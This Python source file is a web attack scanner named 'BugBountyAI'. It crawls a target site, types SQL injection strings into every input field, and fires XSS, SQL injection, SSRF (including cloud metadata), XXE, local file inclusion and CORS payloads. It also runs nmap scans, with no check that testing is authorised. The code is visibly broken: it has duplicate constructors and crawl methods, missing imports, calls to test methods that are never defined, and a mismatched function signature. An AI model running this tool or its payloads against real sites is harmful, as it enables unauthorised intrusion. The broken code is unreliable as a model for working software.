import os
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import time
import random
from transformers import pipeline
import nmap
import json
from concurrent.futures import ThreadPoolExecutor

class BugBountyAI:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.session.verify = False  
        requests.packages.urllib3.disable_warnings()  

        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--disable-dev-shm-usage")
        self.chrome_options.add_argument("--window-size=1920,1080")
        self.chrome_options.add_argument("--remote-debugging-port=9222")
        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.set_page_load_timeout(30)

    def update_progress(self, progress, message):
        """Update scan progress"""
        self.progress = progress
        self.status_message = message
        print(f"[Progress: {progress}%] {message}")

    def crawl(self, start_url, depth=0):
        """Enhanced crawling with more interaction"""
        if depth > self.config['max_depth'] or start_url in self.visited_urls:
            return
            
        self.visited_urls.add(start_url)
        progress = int((len(self.visited_urls) / (self.config['max_depth'] * 10)) * 100)
        self.update_progress(progress, f"Crawling: {start_url}")
        print(f"[*] Crawling: {start_url}")
        
        try:
            self.driver.get(start_url)
            time.sleep(random.uniform(*self.config['rate_limit_delay']))
            
            self.interact_with_page()
            
            soup = BeautifulSoup(self.driver.page_source, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            
            self.find_hidden_endpoints(soup)
            
            self.test_page(start_url, soup)
            
            for link in links:
                absolute_url = urljoin(start_url, link)
                if self.is_in_scope(absolute_url):
                    self.crawl(absolute_url, depth + 1)
                    
        except Exception as e:
            print(f"[!] Error crawling {start_url}: {str(e)}")

    def interact_with_page(self):
        """Interact with page elements to trigger dynamic content"""
        try:
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            for button in buttons:
                try:
                    button.click()
                    time.sleep(0.5)
                except:
                    continue
                    
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            for input in inputs:
                try:
                    if input.get_attribute("type") in ["text", "email", "password"]:
                        input.send_keys("test' OR 1=1--")
                        time.sleep(0.3)
                except:
                    continue
        except Exception as e:
            print(f"[!] Interaction error: {str(e)}")

    def find_hidden_endpoints(self, soup):
        """Find hidden endpoints in JavaScript and metadata"""
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                self.extract_urls_from_text(script.string)
                
        links = soup.find_all('link', href=True)
        for link in links:
            if any(x in link['href'] for x in ['api', 'json', 'xml']):
                self.test_api_endpoint(urljoin(self.current_scope, link['href']))
                
        metas = soup.find_all('meta')
        for meta in metas:
            if 'content' in meta.attrs:
                self.extract_urls_from_text(meta['content'])

    def extract_urls_from_text(self, text):
        """Extract URLs from arbitrary text"""
        import re
        urls = re.findall(r'https?://[^\s<>"\']+', str(text))
        for url in urls:
            if self.is_in_scope(url):
                self.test_api_endpoint(url)

    def test_cors(self, url):
        """Test for CORS misconfigurations"""
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET'
            }
            response = self.session.options(url, headers=headers)
            
            if 'access-control-allow-origin' in response.headers:
                if response.headers['access-control-allow-origin'] == '*':
                    self.record_vulnerability(
                        type="CORS Misconfiguration",
                        url=url,
                        payload="Wildcard CORS",
                        confidence=0.9,
                        details="Server allows requests from any origin (*)"
                    )
                elif 'evil.com' in response.headers['access-control-allow-origin']:
                    self.record_vulnerability(
                        type="CORS Misconfiguration",
                        url=url,
                        payload="Reflected Origin",
                        confidence=0.85,
                        details="Server reflects arbitrary Origin header"
                    )
        except Exception as e:
            print(f"[!] CORS test error: {str(e)}")

    def test_jwt(self, url):
        """Test for JWT vulnerabilities"""
        try:
            response = self.session.get(url)
            cookies = response.cookies
            
            for cookie in cookies:
                if len(cookie.value.split('.')) == 3:  
                    self.record_vulnerability(
                        type="JWT Usage Detected",
                        url=url,
                        payload=cookie.name,
                        confidence=0.7,
                        details="JWT token found - manual inspection recommended"
                    )
        except Exception as e:
            print(f"[!] JWT test error: {str(e)}")

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--no-sandbox")
        self.driver = webdriver.Chrome(options=self.chrome_options)
        
        self.vuln_classifier = pipeline("text-classification", model="distilbert-base-uncased")
        self.payload_generator = pipeline("text-generation", model="gpt2")
        
        self.config = {
            'max_depth': 10,  # Increased from 5 to 10
            'threads': 12,    # Increased from 8 to 12
            'rate_limit_delay': (0.3, 1.5),  # More aggressive scanning
            'test_payloads': {
                'xss': [
                    '<script>alert(1)</script>', 
                    '<img src=x onerror=alert(1)>',
                    '" onmouseover=alert(1) "',
                    '<svg/onload=alert(1)>',
                    'javascript:alert(1)',
                    '"><script>alert(1)</script>',
                    '"><iframe src="javascript:alert(1)">'
                ],
                'sqli': [
                    "' OR '1'='1", 
                    "' OR 1=1--", 
                    '" OR "1"="1', 
                    'admin"--',
                    '1;SELECT * FROM users',
                    '1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))'
                ],
                'idor': [
                    '/api/user/1', 
                    '/admin/../user/2', 
                    '/profile/2', 
                    '/account/3',
                    '/api/v1/users/1',
                    '/admin/user/1/profile'
                ],
                'ssrf': [
                    'http://127.0.0.1', 
                    'http://localhost', 
                    'http://169.254.169.254/latest/meta-data/',
                    'http://internal.service',
                    'file:///etc/passwd'
                ],
                'xxe': [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service">]>'
                ],
                'lfi': [
                    '../../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
                ]
            },
            'detailed_reporting': True
        }
        
        self.visited_urls = set()
        self.vulnerabilities = []
        self.current_scope = None
    
    def set_scope(self, target_url):
        """Define the target scope for testing"""
        parsed = urlparse(target_url)
        self.current_scope = f"{parsed.scheme}://{parsed.netloc}"
    
    def crawl(self, start_url, depth=0):
        """Recursive crawling function with depth limiting"""
        if depth > self.config['max_depth'] or start_url in self.visited_urls:
            return
            
        self.visited_urls.add(start_url)
        print(f"[*] Crawling: {start_url}")
        
        try:
            self.driver.get(start_url)
            time.sleep(random.uniform(*self.config['rate_limit_delay']))
            
            soup = BeautifulSoup(self.driver.page_source, 'html.parser')
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            
            self.test_page(start_url, soup)
            
            for link in links:
                absolute_url = urljoin(start_url, link)
                if self.is_in_scope(absolute_url):
                    self.crawl(absolute_url, depth + 1)
                    
        except Exception as e:
            print(f"[!] Error crawling {start_url}: {str(e)}")
    
    def is_in_scope(self, url):
        """Check if URL is within the defined scope"""
        if not self.current_scope:
            return True
        return url.startswith(self.current_scope)
    
    def test_page(self, url, soup):
        """Enhanced page testing with more comprehensive vulnerability checks"""
        print(f"[*] Testing: {url}")
        
        # Test all forms
        forms = soup.find_all('form')
        for form in forms:
            self.test_form(url, form)
        
        # Test all links for parameters
        links = [a['href'] for a in soup.find_all('a', href=True) if '?' in a['href']]
        for link in links:
            self.test_url_parameters(urljoin(url, link))
        
        # Enhanced vulnerability tests
        self.test_idor(url)
        self.test_ssrf(url, soup)
        self.test_logic_flaws(url, soup)
        self.find_api_endpoints(soup)
        self.test_xxe(url, soup)  
        self.test_lfi(url)
        self.test_cors(url)
        self.test_jwt(url)
        self.test_ssti(url, soup)
        self.test_deserialization(url)
        self.test_dom_xss(url, soup)

    def test_url_parameters(self, url):
        """Test URL parameters for common vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            # Test for XSS in URL parameters
            for payload in self.config['test_payloads']['xss']:
                test_url = url.replace(
                    f"{param}={params[param][0]}",
                    f"{param}={payload}"
                )
                try:
                    response = self.session.get(test_url)
                    if payload in response.text:
                        self.record_vulnerability(
                            type="Reflected XSS",
                            url=test_url,
                            payload=payload,
                            confidence=0.85,
                            details="XSS payload reflected in response"
                        )
                except Exception as e:
                    print(f"[!] XSS test error for {test_url}: {str(e)}")
            
            # Test for SQLi in URL parameters
            for payload in self.config['test_payloads']['sqli']:
                test_url = url.replace(
                    f"{param}={params[param][0]}",
                    f"{param}={payload}"
                )
                try:
                    response = self.session.get(test_url)
                    if "error" in response.text.lower() or "sql" in response.text.lower():
                        self.record_vulnerability(
                            type="SQL Injection",
                            url=test_url,
                            payload=payload,
                            confidence=0.75,
                            details="Possible SQL injection vulnerability"
                        )
                except Exception as e:
                    print(f"[!] SQLi test error for {test_url}: {str(e)}")

    def test_form(self, url, form):
        """Enhanced form testing with better detection"""
        form_details = {
            'action': form.get('action'),
            'method': form.get('method', 'get').lower(),
            'inputs': [input.get('name') for input in form.find_all('input') if input.get('name')]
        }
        
        # Skip forms without inputs
        if not form_details['inputs']:
            return
            
        # Test all payload types
        for vuln_type in ['xss', 'sqli']:
            for payload in self.config['test_payloads'][vuln_type]:
                try:
                    response = self.submit_form_with_payload(form_details, payload)
                    if response:
                        if vuln_type == 'xss' and payload in response.text:
                            self.record_vulnerability(
                                type="Stored XSS",
                                url=url,
                                payload=payload,
                                confidence=0.8,
                                details="XSS payload stored in form response"
                            )
                        elif vuln_type == 'sqli' and ("error" in response.text.lower() or "sql" in response.text.lower()):
                            self.record_vulnerability(
                                type="SQL Injection",
                                url=url,
                                payload=payload,
                                confidence=0.7,
                                details="Possible SQL injection vulnerability"
                            )
                except Exception as e:
                    print(f"[!] {vuln_type} test error: {str(e)}")

    def test_idor(self, url):
        """Test for Insecure Direct Object References"""
        for pattern in self.config['test_payloads']['idor']:
            test_url = urljoin(url, pattern)
            try:
                response = self.session.get(test_url)
                if response.status_code == 200:
                    self.record_vulnerability(
                        type="Potential IDOR",
                        url=test_url,
                        payload=pattern,
                        confidence=0.6
                    )
            except:
                continue
    
    def test_ssrf(self, url, soup):
        """Test for Server-Side Request Forgery vulnerabilities"""
        for payload in self.config['test_payloads'].get('ssrf', []):
            try:
                response = self.session.get(url, params={'url': payload})
                if 'metadata' in response.text or 'root:x' in response.text:
                    self.record_vulnerability(
                        type="SSRF",
                        url=url,
                        payload=payload,
                        confidence=0.7
                    )
            except Exception as e:
                print(f"[!] SSRF test error: {str(e)}")
    
    def find_api_endpoints(self, soup):
        """Find and test API endpoints"""
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                if 'api' in script.get('src').lower():
                    self.test_api_endpoint(urljoin(self.current_scope, script.get('src')))
    
    def test_api_endpoint(self, endpoint):
        """Test identified API endpoints"""
        print(f"[*] Testing API endpoint: {endpoint}")
        try:
            # Test for common API vulnerabilities
            response = self.session.get(endpoint)
            
            # Check for sensitive data exposure
            if response.status_code == 200:
                data = response.json() if 'application/json' in response.headers.get('content-type', '') else {}
                if self.ai_analyze_response(data):
                    self.record_vulnerability(
                        type="Potential Data Exposure",
                        url=endpoint,
                        payload="",
                        confidence=0.75
                    )
                    
            # Test for missing authentication
            auth_test_url = endpoint + "/admin" if not endpoint.endswith("/") else endpoint + "admin"
            auth_response = self.session.get(auth_test_url)
            if auth_response.status_code == 200:
                self.record_vulnerability(
                    type="Missing Authentication",
                    url=auth_test_url,
                    payload="",
                    confidence=0.85
                )
                
        except Exception as e:
            print(f"[!] API test error: {str(e)}")
    
    def ai_analyze_response(self, data):
        """Use AI to analyze responses for sensitive data"""
        text_data = str(data)
        result = self.vuln_classifier(text_data)
        return result[0]['label'] == 'SENSITIVE' and result[0]['score'] > 0.7
    
    def test_logic_flaws(self, url, soup):
        """Test for basic logic flaws (heuristic)"""
        # Example: Check for missing CSRF tokens in forms
        forms = soup.find_all('form')
        for form in forms:
            inputs = [i.get('name','') for i in form.find_all('input')]
            if not any('csrf' in inp.lower() for inp in inputs):
                self.record_vulnerability(
                    type="Potential Logic Flaw",
                    url=url,
                    payload="Missing CSRF token",
                    confidence=0.5
                )
    
    def record_vulnerability(self, type, url, payload, confidence):
        for v in self.vulnerabilities:
            if v['url'] == url and v['type'] == type and v['payload'] == payload:
                return
        self.vulnerabilities.append({
            'type': type,
            'url': url,
            'payload': payload,
            'confidence': confidence,
            'timestamp': time.time()
        })
        similar = [v for v in self.vulnerabilities if v['url'] == url]
        if len(similar) > 2:
            for v in similar:
                v['confidence'] = max(v['confidence'], 0.8)
    
    def generate_report(self):
        """Generate a vulnerability report"""
        report = {
            'target': self.current_scope,
            'date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'vulnerabilities': self.vulnerabilities
        }
        os.makedirs('reports', exist_ok=True)
        filename = f"report_{self.current_scope.replace('://', '_').replace('/', '_')}_{int(time.time())}.json"
        with open(f"reports/{filename}", 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report saved to reports/{filename}")
        return report  # Return the report data along with saving it
    
    def scan_network(self, target_ip):
        """Perform basic network scanning (use with caution)"""
        print(f"[*] Scanning network: {target_ip}")
        scanner = nmap.PortScanner()
        scanner.scan(target_ip, arguments='-sV -T4')
        for host in scanner.all_hosts():
            print(f"\nHost: {host}")
            for proto in scanner[host].all_protocols():
                print(f"Protocol: {proto}")
                ports = scanner[host][proto].keys()
                for port in sorted(ports):
                    print(f"Port: {port}\tState: {scanner[host][proto][port]['state']}")
    
    def run(self, target_url):
        """Main execution method"""
        self.set_scope(target_url)
        self.crawl(target_url)
        
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            executor.submit(self.scan_network, urlparse(target_url).netloc)
        
        self.generate_report()
        self.driver.quit()

if __name__ == "__main__":
    scanner = BugBountyAI()
    target = input("Enter target URL to scan (e.g., https://example.com): ")
    scanner.run(target)